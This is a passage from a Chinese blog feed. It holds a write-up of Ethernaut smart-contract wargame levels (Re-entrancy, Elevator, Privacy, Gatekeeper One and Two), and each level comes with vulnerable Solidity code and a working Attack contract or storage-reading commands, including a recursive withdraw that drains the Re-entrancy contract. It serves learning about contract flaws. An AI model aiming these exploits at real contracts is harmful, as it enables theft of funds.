class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        to.send(<span class="number">1.05</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-Re-entrancy"><a href="#0x01-Re-entrancy" class="headerlink" title="0x01 Re-entrancy"></a>0x01 Re-entrancy</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题就是著名的重入漏洞，首先我们学习几个solidity的基础知识</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.transfer()</span><br></pre></td></tr></table></figure><ul><li>当发送失败时会 <code>throw;</code> 回滚状态</li><li>只会传递部分 Gas 供调用，防止重入（reentrancy）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.send()</span><br></pre></td></tr></table></figure><ul><li>当发送失败时会返回 false</li><li>只会传递部分 Gas 供调用，防止重入（reentrancy）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.call.value()()</span><br></pre></td></tr></table></figure><ul><li>当发送失败时会返回 false</li><li>传递所有可用 Gas 供调用，不能有效防止重入（reentrancy）</li></ul></blockquote><p>可以发现，该合约中使用的正是危险的<code>call.value()()</code>函数。我们可以借此攻击，攻击的原理是，合约会先检查用户的余额，通过测试之后给用户转账，然后扣除相应的余额，那么我们已经知道了，转账操作会调用目标账户的callback函数，若我们在callback函数里再次调用了这里的withdraw，那么会再次执行转账操作，因为余额没有被扣除，所以我们可以递归的将该钱包里面的所有钱都转账出来。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = <span class="number">0xc9402d058d2fcbae5dd29ea4762950af00504ecf</span>;</span><br><span class="line">    Reentrance target = Reentrance(instance_address);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Attack</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        target.donate.value(msg.value)(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_balance</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> target.balanceOf(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">my_eth_bal</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="built_in">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ins_eth_bal</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance_address.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-Elevator"><a href="#0x02-Elevator" class="headerlink" title="0x02 Elevator"></a>0x02 Elevator</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">view</span> <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Elevator</span> </span>&#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">goTo</span>(<span class="params">uint _floor</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>solidity这个view里面居然也是可以修改值的，跪了。</p><p>直接实现isLastFloor()就好</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">view</span> <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Elevator</span> </span>&#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">goTo</span>(<span class="params">uint _floor</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address to = <span class="number">0xe4ab1eeb930a4425f5ef9da4f227c40b9b5cc688</span>;</span><br><span class="line">    Elevator target = Elevator(to);</span><br><span class="line">    bool public isLast = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        isLast = ! isLast;</span><br><span class="line">        <span class="keyword">return</span> isLast;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.goTo(<span class="number">1024</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-Privacy"><a href="#0x03-Privacy" class="headerlink" title="0x03 Privacy"></a>0x03 Privacy</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = <span class="literal">true</span>;</span><br><span class="line">  uint256 public constant ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = <span class="number">10</span>;</span><br><span class="line">  uint8 private denomination = <span class="number">255</span>;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Privacy</span>(<span class="params">bytes32[<span class="number">3</span>] _data</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes16 _key</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(_key == bytes16(data[<span class="number">2</span>]));</span><br><span class="line">    locked = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span></span><br><span class="line"><span class="comment">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span></span><br><span class="line"><span class="comment">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟上面的一道题很像，让我们unlock，那么这里需要读的是转成bytes16的data[2]，我们用一用的方法吧存储的全部数据拿出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address, 0, function(x, y) &#123;alert(y)&#125;);</span><br><span class="line">web3.eth.getStorageAt(contract.address, 1, function(x, y) &#123;alert(y)&#125;);</span><br><span class="line">web3.eth.getStorageAt(contract.address, 2, function(x, y) &#123;alert(y)&#125;);</span><br><span class="line">web3.eth.getStorageAt(contract.address, 3, function(x, y) &#123;alert(y)&#125;);</span><br><span class="line">web3.eth.getStorageAt(contract.address, 4, function(x, y) &#123;alert(y)&#125;);</span><br><span class="line">数据为：</span><br><span class="line">0x0000000000000000000000000000000000000000000000000000009c4dff0a01</span><br><span class="line">0x51641dba3274da0e774037dd4d31623ea60791e676bd23e5553e44ddc6ebd9eb</span><br><span class="line">0xdde5a3957f1e722b01876b459dc5799e91ccc6ab3355a28148246da3c2b41b2f</span><br><span class="line">0xbe7bdb66b7bf731ae259bf386e303a8c892596c3241c9d1ede6a51c3141901a8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为定义的data数组是bytes32的，所以data[2]就是最后一行的数据，转成16位，就取前16位就OK</p><h2 id="0x04-Gatekeeper-One"><a href="#0x04-Gatekeeper-One" class="headerlink" title="0x04 Gatekeeper One"></a>0x04 Gatekeeper One</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.gas.mod(<span class="number">8191</span>) == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) == uint16(_gateKey));</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) != uint64(_gateKey));</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) == uint16(tx.origin));</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前两个都可以在合约层面满足，第三个需要从数据的存储出发来构造</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.gas % <span class="number">8191</span> == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) == uint16(_gateKey));</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) != uint64(_gateKey));</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) == uint16(tx.origin));</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = <span class="number">0x396523f3d78eef3adf4a062fd2acc570462120c2</span>;</span><br><span class="line">    bytes8 _gateKey = bytes8(tx.origin) &amp; <span class="number">0xFFFFFFFF0000FFFF</span>;</span><br><span class="line"></span><br><span class="line">    GatekeeperOne target = GatekeeperOne(instance_address);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.enter.gas(<span class="number">819100</span>), _gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-Gatekeeper-Two"><a href="#0x05-Gatekeeper-Two" class="headerlink" title="0x05 Gatekeeper Two"></a>0x05 Gatekeeper Two</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; <span class="attr">x</span> := extcodesize(caller) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(<span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一关好绕，第三关是数据层面上的构造，第二层查了一下extcodesize，发现是返回代码长度。。。这该如何是好。</p><p>查了大佬的文章后知道这里只要代码在构造函数中就可以了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; <span class="attr">x</span> := extcodesize(caller) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(<span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address to = <span class="number">0x2bc30f8d14fc4d3dd596e4e72ef8a398f5e9cebc</span>;</span><br><span class="line">    GatekeeperTwo target = GatekeeperTwo(to);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Attack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        target.enter((bytes8)(uint64(keccak256(address(<span class="built_in">this</span>))) ^ (uint64(<span class="number">0</span>) - <span class="number">1</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OK，先做到这里。。。剩下的题目。。。。下次一定</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-King&quot;&gt;&lt;a href=&quot;#0x00-King&quot; class=&quot;headerlink&quot; title=&quot;0x00 King&quot;&gt;&lt;/a&gt;0x00 King&lt;/h2&gt;</summary>
    
    
    
    <category term="BlockChain" scheme="http://yoursite.com/categories/BlockChain/"/>
    
    
    <category term="区块链" scheme="http://yoursite.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="智能合约" scheme="http://yoursite.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-WriteUp合集</title>
    <link href="http://yoursite.com/2020/05/15/BUUCTF-WriteUp%E5%90%88%E9%9B%86/"/>
    <id>http://yoursite.com/2020/05/15/BUUCTF-WriteUp%E5%90%88%E9%9B%86/</id>
    <published>2020-05-15T12:56:04.000Z</published>
    <updated>2020-05-19T10:54:38.872Z</updated>
    
